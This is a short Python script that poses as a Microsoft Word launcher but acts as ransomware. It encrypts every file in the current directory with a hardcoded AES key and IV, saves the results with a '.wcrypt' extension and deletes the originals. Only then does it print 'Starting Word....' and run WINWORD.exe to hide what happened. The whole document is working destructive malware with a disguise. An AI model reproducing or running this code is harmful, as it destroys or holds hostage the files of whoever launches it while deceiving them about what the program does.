#! python
import os
from Crypto.Cipher import AES

key = b'^0\xe6\xf2\x0e;U^{\xbe\x9c\x7fO\x8a=C\x97r\xf6\xdb\x8a!F\x19\xdb\xbc\xc2\xf16\xe6\xb4-'
iv = b'\xd8p\xd2\xe35\x1d\xa4SY\x03\xd4osi!>'

cipher = AES.new(key, AES.MODE_CBC, iv)

for filename in os.listdir():
    input_file = os.path.join(os.getcwd(), filename)
    output_file = os.path.join(os.getcwd(), filename+'.wcrypt')

    with open(input_file, 'rb') as fin, open(output_file, 'wb') as fout:
        while True:
            chunk = fin.read(1024 * AES.block_size)
            if len(chunk) == 0:
                break
            chunk_padded = chunk + (AES.block_size - len(chunk) % AES.block_size) * b'\0'
            ciphertext = cipher.encrypt(chunk_padded)
            fout.write(ciphertext)
    os.remove(input_file)
print("Starting Word....")
os.system("WINWORD.exe")
